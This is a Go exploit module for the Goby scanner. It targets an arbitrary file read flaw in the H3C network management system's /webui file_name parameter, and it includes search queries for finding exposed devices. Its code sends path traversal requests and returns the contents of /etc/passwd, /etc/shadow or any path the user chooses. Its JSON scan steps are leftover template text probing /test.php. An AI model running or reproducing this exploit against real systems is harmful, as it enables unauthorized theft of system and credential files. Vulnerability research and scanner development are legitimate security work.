package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "H3C network management system /webui File Read Vulnerability",
    "Description": "<p>H3C network management system is a comprehensive solution for managing enterprise network devices, including network monitoring, configuration management, device management, performance management and other functions. </p><p>There is an arbitrary file reading vulnerability in the file_name parameters of the H3C network management system, which can be exploited by unauthorized attackers to read sensitive information such as website configuration files.</p>",
    "Product": "H3C-Products",
    "Homepage": "https://www.h3c.com/cn/",
    "DisclosureDate": "2024-07-09",
    "PostTime": "2024-09-08",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"webui/js/jquerylib/jquery-1.7.2.min.js\" && body=\"/webui/images/default/default\"",
    "GobyQuery": "body=\"webui/js/jquerylib/jquery-1.7.2.min.js\" && body=\"/webui/images/default/default\"",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the file_name parameters of the H3C network management system, which can be exploited by unauthorized attackers to read sensitive information such as website configuration files.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/LongL_GuYu/article/details/140205533"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,shadow,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../../../../../../etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "H3C网络管理系统 /webui 文件读取漏洞",
            "Product": "H3C-公司产品",
            "Description": "<p>H3C网络管理系统是一款用于管理企业网络设备的全面解决方案，包括网络监控、配置管理、设备管理、性能管理等功能。</p><p>H3C网络管理系统file_name参数存在任意文件读取漏洞，未授权攻击者可以利用其读取网站配置文件等敏感信息。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>H3C网络管理系统file_name参数存在任意文件读取漏洞，未授权攻击者可以利用其读取网站配置文件等敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "H3C network management system /webui File Read Vulnerability",
            "Product": "H3C-Products",
            "Description": "<p>H3C network management system is a comprehensive solution for managing enterprise network devices, including network monitoring, configuration management, device management, performance management and other functions.&nbsp;</p><p>There is an arbitrary file reading vulnerability in the file_name parameters of the H3C network management system, which can be exploited by unauthorized attackers to read sensitive information such as website configuration files.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the file_name parameters of the H3C network management system, which can be exploited by unauthorized attackers to read sensitive information such as website configuration files.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`
	postOrGet_dvuskjvuadgutocjagcagykcgvghfzxxvcgzujkchuasgefyqgud := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/webui/?file_name=" + fileUrl+"&g=sys_dia_data_down")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/webui/?file_name=../../../../../../../../etc/passwd&g=sys_dia_data_down"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../../../../../../../etc/passwd": "root:",
			}
			// 函数继承
			uploadFileFunc := postOrGet_dvuskjvuadgutocjagcagykcgvghfzxxvcgzujkchuasgefyqgud

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"../../../../../../../../etc/passwd", "root:"},
				"shadow": {"../../../../../../../../etc/shadow", "root:"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_dvuskjvuadgutocjagcagykcgvghfzxxvcgzujkchuasgefyqgud

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
